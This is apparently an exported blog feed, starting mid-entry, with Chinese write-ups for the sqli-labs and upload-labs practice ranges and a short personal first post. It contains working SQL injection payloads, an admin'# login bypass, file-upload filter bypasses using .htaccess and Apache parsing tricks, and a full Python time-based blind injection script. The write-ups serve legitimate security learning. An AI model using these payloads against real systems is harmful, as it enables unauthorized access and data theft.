WAF这题与之前的都有所不同，首先是文件夹就有三个，经过查看，一个是index页面，一个是waf页面，一个是错误页面这题由于我只有apache服务器所以直接用index页面不可以，按题目要求应该是要两层服务器一个做waf一个做web服务器，所以我们直接用login.php进行测试经过尝试后发现不行这个waf的作用应该是只能数字进入，绕过的话要使用http参数污染 http参数污染 所以这个题目应该是要前面用数组id=1&amp;id=xxx进行绕过推荐看下这个，我也是看了这个才了解的 https://blog.csdn.net/nzjdsds/article/details/77758824 Less-30 基于错误的GET型双引号字符型注入这题和上题几乎一样，用http参数污染，只要把后面的改成双引号就可以了 参考 https://blog.csdn.net/nzjdsds/article/details/77430073https://blog.csdn.net/qq_21500173/article/details/51964908]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs-writeup 1~5]]></title>
    <url>%2F2019%2F02%2F10%2Fupload-labs-writeup%201~5%2F</url>
    <content type="text"><![CDATA[前言 upload-labs是一个基于php语言的上传漏洞的靶场项目包括(最新commit17ec936) 的19个上传关卡的方法。可以通过git clone https://github.com/c0ny1/upload-labs.git 来搭建属于自己的一个upload练习靶场 正文 Pass-01 客户端js白名单检查通过源码我们可以看出这题对于文件上传的限制是通过前端js，判断是否为.jpg/.png/.gif这三种格式的文件形式，这种是一种js对文件后缀名做了白名单限制，这种限制十分不安全，有好几种绕过方式一：修改js脚本按道理是可以的，但是这里却失败了，尝试了下直接删除onsubmit函数不过还是不行，不过这也是一种思路 二：浏览器禁止使用js脚本(这里以火狐浏览器为例子) 1、在Firefox地址栏里输入“about:config”。2、在搜索栏输入“javascript.enabled”查找到首选项。3、点击鼠标右键选择“切换”，把“javascript.enabled”键值改为“false” 三：Burpsuit进行改包因为js仅仅只对客户端进行限制，而使用Burpsuit却可以绕过客户端限制直接拦截发送给服务端的文件进行修改 将jpg修改成php,可以看到自己本地upload文件夹多处了个php文件 提示一：../upload文件夹不存在,请手工创建！（第一次上传文件时可能会有这个错误提示，在根目录创建一个upload文件夹就可以了）提示二：Burpsuit当url是127.0.0.1是不可以抓包的，可以修改为自己本地IPv4地址比如 192.168.xxx.xxx 这里有个地方要注意，我也是看被人的wp的时候才发现的 null：代表声明了一个空对象，不是一个字符串，可以赋给任何对象，是没有地址。“”：代表声明了一个对象实例，这个对象实例的值是一个长度为0的空字符串，是有地址但是里面的内容是空的。 我的理解是null是不可以不上传文件，’’意思是不能上传空文件 Pass-02 服务端白名单直接采取第一题的Burpuit改包的方式一下就成功了，我们尝试下能否使用其他的方式进行绕过，以便对这题有着更加深刻的理解查看下源码这里显然同样采取了白名单的形式，它会在服务端检测上传文件的Content-Type: 内容格式，这也导致了另一种上传绕过方式，即将上传的php文件的文件格式用Burpsuit进行修改，我们可以看见同样上传成功 Pass-03 服务端黑名单依旧采取第一题的Burpsuit方式，发现会报错错误提示查看源码我们发现这是一种过滤文件后面的.和.asp,.aspx,.php,.jsp等后缀一种黑名单限制，并且不区分大小写，这样我们就不可以通过构造大写来绕过方法一： 特殊后缀绕过尝试使用特殊的php后缀 php2, php3, php4, php5, phps, pht, phtm, phtml结果并没有上传成php文件，查询后原来是apache的配置文件里并没有配置将这些后缀的文件当做php解析，apache的httpd.conf中有如下配置代码AddType application/x-httpd-php .php .phtml .phps .php5 .pht 方法二：解析漏洞尝试采取Apache解析漏洞，因为我是apache服务器所以采取Apache解析漏洞 Apache解析漏洞解析：test.php.(任意不属于黑名单且也不属于Apache解析白名单的名称)，比如test.php.lala描述：一个文件名为test.x1.x2.x3的文件，apache会从x3的位置开始尝试解析，如果x3不属于apache能够解析的扩展名，那么apache会尝试去解析x2，直到能够解析到能够解析的为止，否则就会报错 IIS解析漏洞解析 ：test.asp/(任意文件名)|test.asp；(任意文件名) | (任意文件名)/(任意文件名).php描述：IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”会优先按asp来解析IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析； Nginx解析漏洞解析： (任意文件名)/(任意文件名).php | (任意文件名).php描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 我构造了一个Assert_Post.php.aaa文件（后来发现不能使用aaa后缀而是要特定的后缀如.arex）结果直接上传了个 进行查询了很多个apache不可解析的文件后缀，结果都上传成功了？？？发现，并不是上传后会把它变成php格式文件，而是解析的时候会当成php文件来解析 方法三：.htaccess上传可以看到这里黑名单并没有限制.htaccess文件的上传文件内容如下 &lt;FilesMatch “aaa”&gt; SetHandler application/x-httpd-php 当apache在解析该目录下的php时，就会按照.htaccess中的要求去解析aaa文件解析成php 备注其余配置问题导致漏洞（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。 即我们可以在.htaccess 中添加这两句就可以将JPG以php执行，或者只要文件中含有php就可以以php执行 Pass-04 服务端黑名单加强查看源码发现这里增加了对特殊php后缀的黑名单，不过却没有过滤.htaccess这里我们可以采取第三关的第二种和第三种方式进行绕过 .htaccess是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件。要想使.htaccess文件生效，需要两个条件，一是在Apache的配置文件中写上：AllowOverride All Apache的配置文件一般在/etc/httpd/conf下面的httpd.conf二是Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so Pass-05 服务端黑名单超级加强先上传个.htaccess文件，失败了查看源码 “.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess” 这么多黑名单，嗯以后如果不是这题其他文件上传题目可以看看有没有没有禁用这些黑名单的。方法一:构造.php. .后缀因为deldot只删除了一个点，而在windows下后缀为空格或者.的会被忽略，并且在linux下.为后缀的也同样会被当成php来解析（这里我上传了个没有后缀的文件，或许apache会将它也解析成php文件大概把？） 方法二：大小写绕过这里并没有忽略大小写故我们可以构造.PHP文件后缀进行绕过，经过尝试发现上传成功 参考 https://zhuanlan.zhihu.com/p/52099683http://lawlietweb.com/2018/06/07/upload-labs/]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs less 21 ~ 25a]]></title>
    <url>%2F2019%2F02%2F09%2Fsqli-labs%20less%2021%20~%2025%2F</url>
    <content type="text"><![CDATA[前言 SQLI-LABS是一个学习SQLI的平台以下实验包适用于GET和POST场景,可以通过git clone https://github.com/Audi-1/sqli-labs 来搭建属于自己的一个sql注入练习靶场 正文Less 21 cookie注入 – 基于错误 – 复杂 - 字符串 可以看出username和password都有被过滤，关键在于cookie浏览代码，可以看出一旦用户登入，username就会以base64的形式存入cookie中并且通过这段代码查询出该用户的资料显示在页面上一般情况下这样登陆界面都会有用户注册界面，假设我们现在已经有了用户admin通过登入并且修改cookie进行sql注入，这里我们采取update报错注入（注：updatexml为xml替换语句,如果想详细了解updatexml可以通过在mysql下help updatexml得知具体细节）payload 1231 &apos; or updatexml(1,concat(0x7e,(select database()),0x7e),1)#MSAnIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkj 我们发现成功爆出当前使用数据库名称其他方式太多了，就不一一举例 Less 22 cookie注入 – 基于错误 – 双引号 - 字符串这题与上题几乎一样，只是将单引号改为双引号就可以了这里我们换成extractvalue报错注入（注：extractvalue为xml查询语句，同样想要知道细节可以通过在mysql下help extractvalue得知 ）paload 1231 &quot; or extractvalue(1, concat(0x5c, (select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)))#MSAiIG9yIGV4dHJhY3R2YWx1ZSgxLCBjb25jYXQoMHg1YywgKHNlbGVjdCB0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9J3NlY3VyaXR5JyBsaW1pdCAwLDEpKSkj Less 23 基于错误 – 无评论源码如下：这里id，虽然只有被单引号包住，但是却有过滤 preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed 简单的说preg_replace — 是一个执行一个正则表达式的搜索和替换的函数，这里的意思是将–,#替换成空格也就是说我们不能通过这两种方式进行闭合，但我们可以通过 or ‘1 这样的形式构造出如下这种形式进行注释 1$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos; xxx or &apos;1&apos; LIMIT 0,1&quot;; 这次我们换成union注入pyload 1https://192.168.43.7/sqli-labs/Less-23/index.php?id=0&apos; union select 1,2,database() or &apos;1 id=0，为什么要用0，因为sql语句执行了两个select语句，如果第一个查询的出来就无法使第二个select语句得到我们想要的效果 Less 24 二次注入这关不同以往是一个完整的网站，有登入，注册，以及找回密码首先我们先审计下源码，看看有没有可以利用的sql语句首先进入index.php，没有发现什么特殊地方，于是接着查找login.php可以看出这里有sql语句，但是有过滤函数，我们转到过滤函数看看有没可以利用的地方,经过查询可以发现这是一个php内置的函数，它的作用如下（这个函数在php5.5后已经被弃用） mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false，受影响字符\x，00，\n，\r，&#39;，”，\x1a,详细可看这里 一番审计后，在pass_change.php中发现了没有过滤的变量如下： 我们可以发现，如果没有用户登入是无法进入pass_change.php页面的这里我们可以发现session[‘username’]是直接由新用户名字组成的，于是我们构成pop链 :注册新用户=&gt;用新用户的账号进行注入=&gt;进入更改密码界面进行真正注入于是达成二次注入的效果首先先随便用一个账号密码登入，用bp改包 1login_user=admin&apos;#&amp;login_password=aa&amp;mysubmit=Login 这样可以绕过密码验证，然后再更改密码，这样就可以将admin的密码更改了（注释:这里可能会遇到登入后没有界面情况可以在这里解决） Less 25 过滤了or和and preg_replace进行过滤or和and通过这个函数进行我的第一个想法是通过如下形式进行绕过，不过不行 10&apos; o/**/r sleep(5)# 尝试下改下大小写，结果不行，查下正则在i模式的匹配，忽略大小写，我们只能尝试下or和and对应的逻辑符号进行注入了 $a &amp;&amp; $b And（逻辑与）$a || $b Or（逻辑或） 发现可以(注:这里要记得进行url编码，不然会失败)当然这里还可以通过双写绕过oorr，aandnd，毕竟这里只有过滤一次 Less 25a 用 OR 和 AND 欺骗 与盲注这里我们有两个方法，一个是联合注入一个是sleep盲注(注:sleep还可以用这个函数替换BENCHMARK(1000000,MD5(‘A’)))payload1联合注入由于把输出的给关了，只能盲注了盲注的时候怎么弄也不行(我个人认为是可以的 不过貌似出现了意外不行 可能是配置出现什么问题)本地测试时可以的实际测试的时候却会出现问题。脚本如下仅做参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117# -*- coding: UTF-8 -*-import requestsimport time#A:65,Z:90 a:97,z:122,0:48,9:57brr=[]url=&apos;https://192.168.43.7/sqli-labs/Less-26/?id=1&apos;str_all=&quot; 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;+-*/=#&quot;r=requests.session()def test1(x): arr=[] for i in range(1,20): for j in str_all: starttime=time.time() payload=&quot; anandd if((substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit &#123;&#125;,1),&#123;&#125;,1)=&apos;&#123;&#125;&apos;),sleep(5),0) --+&quot;.format(str(x),str(i),str(j)) a=url+payload res=r.get(a) print a if j == &apos;#&apos;: return j if time.time()-starttime &gt;4: if j==&apos; &apos;: brr.append(q) return j arr.append(j) break q=&apos;&apos;.join(arr) print qdef test2(x): arr=[] for i in range(1,20): for j in str_all: starttime=time.time() payload=payload=&quot; anandd if((substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; anandd table_name=&apos;users&apos; limit &#123;&#125;,1),&#123;&#125;,1)=&apos;&#123;&#125;&apos;),sleep(5),0) --+&quot;.format(str(x),str(i),str(j)) a=url+payload res=r.get(a) print a if j == &apos;#&apos;: return j if time.time()-starttime &gt;4: if j==&apos; &apos;: brr.append(q) return j arr.append(j) break q=&apos;&apos;.join(arr) print qdef test3(x): arr=[] for i in range(1,20): for j in str_all: starttime=time.time() payload=&quot; anandd if((substr((select username from users limit &#123;&#125;,1),&#123;&#125;,1)=&apos;&#123;&#125;&apos;),sleep(5),0) --+&quot;.format(str(x),str(i),str(j)) a=url+payload res=r.get(a) print a if j == &apos;#&apos;: return j if time.time()-starttime &gt;4: if j==&apos; &apos;: brr.append(q) return j arr.append(j) break q=&apos;&apos;.join(arr) print qdef databasenamemid(): #求数据库的名字 arr=[] for i in range(1,9): for j in str_all: starttime=time.time() payload=&quot; anandd if((substr((select database()),&#123;&#125;,1)=&apos;&#123;&#125;&apos;),sleep(5),0) --+&quot;.format(str(i),str(j)) a=url+payload res=r.get(a) print a if j==&apos;#&apos;: return if time.time()-starttime &gt;4: arr.append(j) break b=&apos;&apos;.join(arr) print bdef tablesname(): #求表名 x=0 while x &lt; 10: j=test1(x) if j == &apos;#&apos;: break x=x+1 print(brr) print(brr)def columsname(): #求列名 x=0 while x &lt; 10: j=test2(x) if j == &apos;#&apos;: break x=x+1 print(brr) print(brr)def colums(): #求字段名 x=0 while x &lt; 10: j=test3(x) if j == &apos;#&apos;: break x=x+1 print(brr) print(brr)databasenamemid()#tablesname()#columsname()#colums()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[新的一年，新的开始]]></title>
    <url>%2F2019%2F02%2F05%2F%E6%96%B0%E7%9A%84%E4%B8%80%E5%B9%B4%EF%BC%8C%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B%2F</url>
    <content type="text"><![CDATA[引言 这是我的第一篇博客，也是今年的第一天，希望今天是一切新的开始，也希望未来一年一切顺利。 正文 大概很早之前我就想搭建一个属于自己的博客，一直都没有机会，原本来打算暑假开始后十天左右就开始着手搭建一个博客，但是由于种种原因拖了将近一个星期，不过能够在这个新年的第一天发表我的第一篇博客，也算是十分圆满。过去的一年已经悄悄过去，在这一年中,我经历了很多挫折，总的来说，很多时候自己付出了努力，但是却没有取得希望的结果，这有自己的一部分自己的原因，也有一部分外部原因。或许是运气使然，偶然的机会下，我接触到了安全这个行业，同时也给我一个新的努力方向，希望未来能够通过努力，能获得自己想要的结果。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
</search>
